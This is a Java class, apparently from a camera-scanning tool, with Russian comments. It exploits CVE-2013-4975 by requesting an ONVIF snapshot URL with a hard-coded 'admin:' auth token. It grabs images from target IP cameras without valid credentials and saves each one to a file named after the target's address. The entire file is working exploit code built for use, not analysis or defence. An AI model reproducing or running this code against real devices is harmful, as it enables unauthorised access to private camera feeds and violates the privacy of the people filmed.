package scanner.onvif;

import lombok.SneakyThrows;
import okhttp3.Response;
import okhttp3.ResponseBody;
import scanner.http.HttpClient;
import scanner.stat.ScreenStatItem;

import javax.imageio.ImageIO;
import java.awt.image.BufferedImage;
import java.io.File;
import java.io.InputStream;
import java.util.Objects;

import static scanner.stat.StatDataHolder.SCREEN_GATHERER;

/**
 * Класс обработки изображения цели через использование интерфейса ONVIF.
 * <p>При использовании уязвимости CVE-2013-4975 для получения снимка экрана можно обращаться напрямую к
 * устройству посредством веб-интерфейса через протокол ONVIF.
 *
 * @author inkarnadin
 * on 14-10-2021
 */
public class OnvifScreenSaver {

    private static final String ONVIF_SCREEN = "http://%s/onvif-http/snapshot?auth=YWRtaW46";

    /**
     * Метод получения изображения.
     *
     * @param ip адрес цели
     * @return статус получения и сохранения изображения, если изображение получено, вернется {@code true}, иначе {@code false}
     */
    @SneakyThrows
    public static boolean saveSnapshot(String ip) {
        try (Response response = HttpClient.doGet(String.format(ONVIF_SCREEN, ip))) {
            if (response.code() == 200) {
                ResponseBody body = response.body();
                if (Objects.isNull(body))
                    return false;

                InputStream inputStream = body.byteStream();

                File file = new File(String.format("result/screen/%s.jpg", ip));
                BufferedImage image = ImageIO.read(inputStream);
                ImageIO.write(image, "jpg", file);

                if (file.exists()) {
                    SCREEN_GATHERER.increment(ScreenStatItem.SUCCESS);
                    return true;
                }
            }
        }
        return false;
    }

}